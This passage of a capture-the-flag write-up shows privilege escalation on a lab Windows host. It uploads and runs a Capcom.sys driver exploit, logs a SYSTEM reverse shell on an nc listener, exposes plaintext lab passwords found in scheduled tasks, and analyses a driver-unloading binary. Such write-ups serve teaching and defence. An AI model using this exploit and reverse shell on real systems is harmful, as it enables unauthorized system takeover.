Info: Uploading ExploitCapcom.exe to C:\programdata\ExploitCapcom.exe

Data: 363860 bytes of 363860 bytes copied

Info: Upload successful!

```

To run it, I just need to run the `ExploitCapcom.exe` binary with my `nc` listener waiting:

```
*Evil-WinRM* PS C:\programdata> .\ExploitCapcom.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000080
[*] Shellcode was placed at 000001D1FD540008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program

```

If it fails right away at `CreateFile`, this means the driver is not loaded:

```
*Evil-WinRM* PS C:\programdata> .\ExploitCapcom.exe
[*] Capcom.sys exploit
[-] CreateFile failed    

```

It is trying to open a handle to the IOCTL device the driver exposes, and failing.

Assuming it does work, I’ll get a shell on my listener:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.193.
Ncat: Connection from 10.10.10.193:49827.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\programdata>whoami
nt authority\system

```

From here I can grab `root.txt`:

```

C:\Users\Administrator\Desktop>type root.txt
04805bdc************************

```

## Beyond Root - Automation

I took a look at the automation on the box by looking at the scheduled tasks:

```

PS C:\programdata> get-scheduledtask
get-scheduledtask

TaskPath                                       TaskName                                                      
--------                                       --------                         
\                                              Revert Password and Expiry      
\                                              Revert2                          
\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319  
\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.3031...
\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.3031...
\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.3031...
...[snip]...

```

The top two seem interesting.

The first one shows the PowerShell commands for the password resets for three users (I must have missed one):

```

PS C:\programdata> (get-scheduledtask -taskname "Revert Password and Expiry").actions | fl execute, arguments
(get-scheduledtask -taskname "Revert Password and Expiry").actions | fl execute, arguments

execute   : powershell.exe
arguments : -c Set-ADAccountPassword -Identity bnielson -Reset -NewPassword 
            (ConvertTo-SecureString -AsPlainText "Fabricorp01" -Force); 
            Get-ADUser -Identity bnielson | Set-ADUser 
            -ChangePasswordAtLogon:$true; Set-ADAccountPassword -Identity 
            tlavel -Reset -NewPassword (ConvertTo-SecureString -AsPlainText 
            "Fabricorp01" -Force); Get-ADUser -Identity tlavel | Set-ADUser 
            -ChangePasswordAtLogon:$true; Set-ADAccountPassword -Identity 
            bhult -Reset -NewPassword (ConvertTo-SecureString -AsPlainText 
            "Fabricorp01" -Force); Get-ADUser -Identity bhult | Set-ADUser 
            -ChangePasswordAtLogon:$true;

```

For each user, it runs:

```

Set-ADAccountPassword -Identity bnielson -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Fabricorp01" -Force);
Get-ADUser -Identity bnielson | Set-ADUser -ChangePasswordAtLogon:$true;

```

These two commands reset the password to the known password, and then set the password change flag.

The second task just runs a `.ps1` script.

```

PS C:\programdata> (get-scheduledtask -taskname "Revert2").actions | fl execute, arguments
(get-scheduledtask -taskname "Revert2").actions | fl execute, arguments

execute   : powershell.exe
arguments : -ep bypass C:\ProgramData\Microsoft\revert.ps1

```

The script is running as svc-print, and it runs this `unload_driver.exe`:

```

PS C:\programdata> cat C:\ProgramData\Microsoft\revert.ps1
$password = ConvertTo-SecureString -String '$fab@s3Rv1ce$1' -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ("FABRICORP\svc-print", $password);
Start-Process C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Argument "Import-Module C:\ProgramData\Microsoft\Set-LHSTokenPrivilege.ps1; C:\ProgramData\Microsoft\unload_driver.exe; Remove-Item -Path HKCU:\System\CurrentControlSet\* -Recurse" -Credential $credential

```

I pulled the binary back to take a look at it. `strings` gives some hint as to what it’s doing:

```

root@kali# strings -n 12 -el unload_driver.exe
GetTokenInformation failed, error: %d
The owner SID is invalid.
[+] Error while getting user SID
\Registry\User\
\System\CurrentControlSet\CAPCOM
unload_driver_test.cpp
unload_driver_test.cpp
unload_driver_test.cpp
unload_driver_test.cpp
Enabled by default
Used for access
SeLoadDriverPrivilege
Aapi-ms-win-core-fibers-l1-1-1
api-ms-win-core-synch-l1-2-0
xAssertion failed: %Ts, file %Ts, line %d
Microsoft Visual C++ Runtime Library
Assertion failed!
Expression: 
For information on how your program can cause an assertion
failure, see the Visual C++ documentation on asserts
(Press Retry to debug the application - JIT must be enabled)
<program name unknown>
dddd, MMMM dd, yyyy
         (((((                  H
         (((((                  H
      (                          
Aapi-ms-win-core-datetime-l1-1-1
api-ms-win-core-file-l1-2-2
api-ms-win-core-localization-l1-2-1
api-ms-win-core-localization-obsolete-l1-2-0
api-ms-win-core-processthreads-l1-1-2
api-ms-win-core-string-l1-1-0
api-ms-win-core-sysinfo-l1-2-1
api-ms-win-core-winrt-l1-1-0
api-ms-win-core-xstate-l2-1-0
api-ms-win-rtcore-ntuser-window-l1-1-0
api-ms-win-security-systemfunctions-l1-1-0
ext-ms-win-ntuser-dialogbox-l1-1-0
ext-ms-win-ntuser-windowstation-l1-1-0
api-ms-win-appmodel-runtime-l1-1-2

```

I opened Ghidra, did a search for strings, and went to the function that references `\\System\\CurrentControlSet\\CAPCOM`:

![image-20200621111950975](https://0xdfimages.gitlab.io/img/image-20200621111950975.png)

It uses `GetModuleHandleA` and `GetProcAddress` to load the `NtUnloadDriver` function access. At the bottom, lines 30-32 build string for registry location, then that’s used to create a unicode string, and then passed to `NtUnloadDriver`. Of course, this doesn’t clean up after a driver that’s been installed in a nonstandard location. For example, I loaded the driver to:

```

\Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\dfserv

```

Still, it will help clean up after people going the default route.